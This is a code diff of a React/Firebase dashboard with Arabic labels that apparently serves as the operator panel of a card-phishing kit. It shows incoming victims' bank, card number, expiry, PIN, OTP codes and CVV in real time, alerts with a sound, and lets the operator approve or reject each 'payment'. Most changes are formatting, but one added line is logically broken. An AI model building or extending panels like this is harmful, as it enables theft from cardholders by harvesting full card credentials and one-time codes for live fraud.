@@ -6,7 +6,6 @@ import { Trash2 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { ar } from "date-fns/locale"
-
 import { formatDistanceToNow } from "date-fns"
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
 import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
@@ -35,13 +34,12 @@ interface Notification {
   otp?: string
   allOtps: string[]
   violationValue?: string
-  personalInfo:{
-    id:string
+  personalInfo: {
+    id: string
   }
-
 }
 
-export default function NotificationsPage1() {
+export default function NotificationsPage() {
   const [notifications, setNotifications] = useState<Notification[]>([])
   const [isLoading, setIsLoading] = useState(true)
   const [pageName, setPagename] = useState<string>("")
@@ -79,7 +77,7 @@ export default function NotificationsPage1() {
             return { id: doc.id, ...data }
           })
           .filter((notification: any) => !notification.isHidden) as Notification[]
-          
+
         setNotifications(notificationsData)
         setIsLoading(false)
         playNotificationSound()
@@ -92,6 +90,7 @@ export default function NotificationsPage1() {
 
     return unsubscribe
   }
+
   const handleClearAll = async () => {
     setIsLoading(true)
     try {
@@ -119,9 +118,6 @@ export default function NotificationsPage1() {
     }
   }
 
-  const handlePageName = (id: string) => {
-    setPagename("asd")
-  }
   const handleApproval = async (state: string, id: string) => {
     const targetPost = doc(db, "pays", id)
     await updateDoc(targetPost, {
@@ -198,7 +194,7 @@ export default function NotificationsPage1() {
             <tbody>
               {notifications.map((notification) => (
                 <tr key={notification.id} className="border-b border-gray-700">
-                  <td className="px-4 py-3">{notification!.personalInfo.id}</td>
+                  <td className="px-4 py-3">{notification.personalInfo.id}</td>
                   <td className="px-4 py-3">
                     <div className="flex flex-col sm:flex-row gap-2">
                       <Badge
@@ -219,11 +215,12 @@ export default function NotificationsPage1() {
                   </td>
                   <td className="px-4 py-3">خطوه - {notification.pagename}</td>
                   <td className="px-4 py-3">
-                  {notification.timestamp &&formatDistanceToNow(new Date(notification.timestamp), {
-                      addSuffix: true,
-                      locale: ar,
-                    })}
-                  </td>{" "}
+                    {notification.timestamp &&
+                      formatDistanceToNow(new Date(notification.timestamp), {
+                        addSuffix: true,
+                        locale: ar,
+                      })}
+                  </td>
                   <td className="px-4 py-3 text-center">
                     <Badge variant="default" className="bg-green-500">
                       1
@@ -281,26 +278,23 @@ export default function NotificationsPage1() {
               <p>
                 <strong className="text-red-400 mx-4">البنك:</strong> {selectedNotification.bank}
               </p>
-              <p></p>
               <p>
                 <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{" "}
-                {selectedNotification.cardNumber && selectedNotification.cardNumber}
+                {selectedNotification.prefix +" - "+ selectedNotification.cardNumber && selectedNotification.cardNumber}
               </p>
               <p>
                 <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong> {selectedNotification.year}/
                 {selectedNotification.month}
               </p>
-
               <p className="flex items-center">
                 <strong className="text-red-400 mx-4">رمز البطاقة :</strong> {selectedNotification.pass}
               </p>
               <p className="flex items-centerpt-4">
                 <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification.otp}
-              </p> 
+              </p>
               <p className="flex items-centerpt-4">
                 <strong className="text-red-400 mx-4">رمز الأمان :</strong> {selectedNotification.cvv}
               </p>
-              <></>
               <p>
                 <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
                 <div className="grid grid-cols-4">
